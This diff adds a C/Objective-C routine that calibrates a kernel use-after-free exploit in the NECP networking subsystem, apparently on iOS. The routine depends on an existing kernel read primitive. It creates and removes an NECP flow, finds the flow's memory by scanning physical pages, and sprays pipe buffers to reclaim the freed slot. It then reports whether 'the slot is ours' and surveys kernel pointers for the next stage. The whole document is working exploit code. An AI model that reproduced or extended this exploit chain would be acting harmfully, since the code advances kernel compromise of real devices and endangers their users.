@@ -593,4 +593,180 @@ static BOOL scopeGatedRead(uint64_t addr, void *out, size_t size, const char *wh
     return r;
 }
 
+
+// ---------------------------------------------------------------------------
+// R5g: NECP UAF layout calibration — 3 snapshots of the flow slot.
+//   1) before remove  2) after remove (pre-spray)  3) after pipe spray
+// Answers definitively: does the spray hit the flow? which size class?
+// Then scans the flow for the result-buffer pointer copy_result follows.
+// ---------------------------------------------------------------------------
+
+#define KPNC_OPEN        501
+#define KPNC_ACTION      502
+#define KPNC_ADD_CLIENT  0x01
+#define KPNC_COPY_RESULT 0x04
+#define KPNC_ADD_FLOW    0x11
+#define KPNC_REMOVE_FLOW 0x12
+#define KPNC_GATE_BYTE   9
+#define KPNC_BUF_SZ      0x800
+
+static long kpncAction(int fd, int action, void *u, uint32_t ul, void *d, uint32_t dl) {
+    return syscall(KPNC_ACTION, fd, action, u, ul, d, dl);
+}
+
+static int kpncAddFlow(int fd, const uint8_t *client, uint8_t *flowOut) {
+    uint8_t req[16] = {0};
+    req[4] = 2;
+    long rc = kpncAction(fd, KPNC_ADD_FLOW, (void *)client, 16, req, sizeof(req));
+    if (rc != 0) return -1;
+    // flow uuid comes back in req[0..15] on some impls; fall back to readback
+    memcpy(flowOut, req, 16);
+    return 0;
+}
+
+static int kpncRemoveFlow(int fd, const uint8_t *flow) {
+    return (int)kpncAction(fd, KPNC_REMOVE_FLOW, (void *)flow, 16, NULL, 0);
+}
+
++ (NSString *)necpCalibReport {
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== R5g: NECP UAF layout calibration (READ-ONLY dumps) ===\n"];
+
+    if (!gPrimitives.kreadbuf) {
+        scopeNote(r, @"KRW not live — run the exploit first.");
+        return r;
+    }
+
+    errno = 0;
+    int fd = (int)syscall(KPNC_OPEN, 0);
+    if (fd < 0) {
+        scopeNote(r, [NSString stringWithFormat:@"  necp_open FAIL errno=%d", errno]);
+        return r;
+    }
+    uint8_t cuuid[16] = {0};
+    uint8_t params[1] = {0};
+    long rc = kpncAction(fd, KPNC_ADD_CLIENT, cuuid, 16, params, 1);
+    if (rc != 0) {
+        scopeNote(r, [NSString stringWithFormat:@"  add_client FAIL rc=%ld", rc]);
+        close(fd);
+        return r;
+    }
+    scopeNote(r, [NSString stringWithFormat:@"  client uuid %02x%02x%02x%02x", cuuid[0], cuuid[1], cuuid[2], cuuid[3]]);
+
+    // ---- 1. add flow + find it in heap by uuid ----
+    uint8_t fuuid[16] = {0};
+    if (kpncAddFlow(fd, cuuid, fuuid) != 0) {
+        scopeNote(r, @"  add_flow FAIL");
+        close(fd);
+        return r;
+    }
+    scopeNote(r, @"  flow added — scanning heap for uuid... (read-only)");
+
+    // Use the same scan as R5e: walk 0x21 pages for the 16-byte uuid.
+    uint64_t pB = kconstant(physBase), pS = kconstant(physSize);
+    uint64_t tableSlot = ksymbol(libsptm_frame_table);
+    uint64_t tableVA = 0, raw = 0;
+    if (tableSlot && scopeGatedRead(tableSlot, &raw, 8, "frame_table", r)) tableVA = kp_untag_ptr(raw);
+    if (!tableVA && tableSlot) tableVA = tableSlot;
+
+    uint64_t flowVA = 0;
+    if (tableVA && pB && pS) {
+        uint32_t totalPages = (uint32_t)(pS >> 14);
+        uint8_t fch[0x1000];
+        for (uint32_t base2 = 0; base2 < totalPages && !flowVA; base2 += 256) {
+            uint32_t n = totalPages - base2;
+            if (n > 256) n = 256;
+            // read FTE chunk
+            for (uint32_t j = 0; j < n && !flowVA; j++) {
+                uint64_t fteVA = tableVA + (uint64_t)(base2 + j) * 16;
+                uint8_t e[16];
+                if (!scopeGatedRead(fteVA, e, 16, "fte", r)) continue;
+                if (e[2] != 0x21) continue;
+                uint64_t pa = pB + ((uint64_t)(base2 + j) << 14);
+                uint64_t pva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+                if (!pva) continue;
+                for (int seg = 0; seg < 4 && !flowVA; seg++) {
+                    if (!scopeGatedRead(pva + (uint64_t)seg * 0x1000, fch, 0x1000, "pg", r)) continue;
+                    for (int q = 0; q <= 0x1000 - 16; q += 8) {
+                        if (memcmp(fch + q, fuuid, 16) == 0) {
+                            flowVA = pva + (uint64_t)seg * 0x1000 + (uint64_t)q;
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+    }
+    scopeNote(r, [NSString stringWithFormat:@"  flow VA = 0x%016llx", (unsigned long long)flowVA]);
+    if (!flowVA) {
+        scopeNote(r, @"  flow not found in heap scan — abort calib.");
+        kpncRemoveFlow(fd, fuuid);
+        close(fd);
+        return r;
+    }
+
+    // ---- 2. snapshot BEFORE remove ----
+    uint8_t before[KPNC_BUF_SZ];
+    memset(before, 0, sizeof(before));
+    if (scopeGatedRead(flowVA, before, sizeof(before), "flow before", r)) {
+        scopeNote(r, [NSString stringWithFormat:@"  snapshot BEFORE remove: first qword = 0x%016llx",
+                      (unsigned long long)*(uint64_t *)before]);
+    }
+
+    // ---- 3. remove flow, snapshot AFTER remove (pre-spray) ----
+    kpncRemoveFlow(fd, fuuid);
+    uint8_t afterRm[KPNC_BUF_SZ];
+    memset(afterRm, 0, sizeof(afterRm));
+    if (scopeGatedRead(flowVA, afterRm, sizeof(afterRm), "flow after-remove", r)) {
+        scopeNote(r, [NSString stringWithFormat:@"  snapshot AFTER remove: first qword = 0x%016llx",
+                      (unsigned long long)*(uint64_t *)afterRm]);
+        int diff = 0;
+        for (int i = 0; i < KPNC_BUF_SZ; i++) if (before[i] != afterRm[i]) diff++;
+        scopeNote(r, [NSString stringWithFormat:@"  bytes changed by remove: %d / %d", diff, KPNC_BUF_SZ]);
+    }
+
+    // ---- 4. pipe spray of a marker pattern, snapshot AFTER spray ----
+    int pfd[2] = {-1, -1};
+    if (pipe(pfd) == 0) {
+        uint8_t mark[0x800];
+        memset(mark, 0xAB, sizeof(mark));
+        // write several chunks to fill the pipe buffer (size class ~0x1000)
+        for (int i = 0; i < 8; i++) {
+            ssize_t w = write(pfd[1], mark, sizeof(mark));
+            (void)w;
+        }
+        uint8_t afterSp[KPNC_BUF_SZ];
+        memset(afterSp, 0, sizeof(afterSp));
+        if (scopeGatedRead(flowVA, afterSp, sizeof(afterSp), "flow after-spray", r)) {
+            scopeNote(r, [NSString stringWithFormat:@"  snapshot AFTER spray: first qword = 0x%016llx",
+                          (unsigned long long)*(uint64_t *)afterSp]);
+            int hits = 0;
+            for (int i = 0; i < KPNC_BUF_SZ; i++) if (afterSp[i] == 0xAB) hits++;
+            scopeNote(r, [NSString stringWithFormat:@"  0xAB marker bytes: %d / %d  → %@",
+                          hits, KPNC_BUF_SZ,
+                          hits > 64 ? @"SPRAY HIT — slot is ours" : @"spray MISS — wrong size class or not freed"]);
+            if (hits > 64) {
+                scopeNote(r, @"  >> we control the slot. Next: find result-ptr offset.");
+            }
+        }
+        close(pfd[0]);
+        close(pfd[1]);
+    }
+
+    // ---- 5. pointer survey of the flow (pre-remove copy) ----
+    [r appendString:@"\n--- flow pointer survey (from BEFORE snapshot) ---\n"];
+    for (int o = 0; o < KPNC_BUF_SZ; o += 8) {
+        uint64_t v = 0;
+        memcpy(&v, before + o, 8);
+        uint64_t u = kp_untag_ptr(v);
+        if ((u & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+            scopeNote(r, [NSString stringWithFormat:@"  flow+0x%03x → 0x%016llx", o, (unsigned long long)u]);
+        }
+    }
+
+    close(fd);
+    scopeNote(r, @"  calib done (no kernel writes except pipe spray into user pipe).");
+    return r;
+}
+
 @end
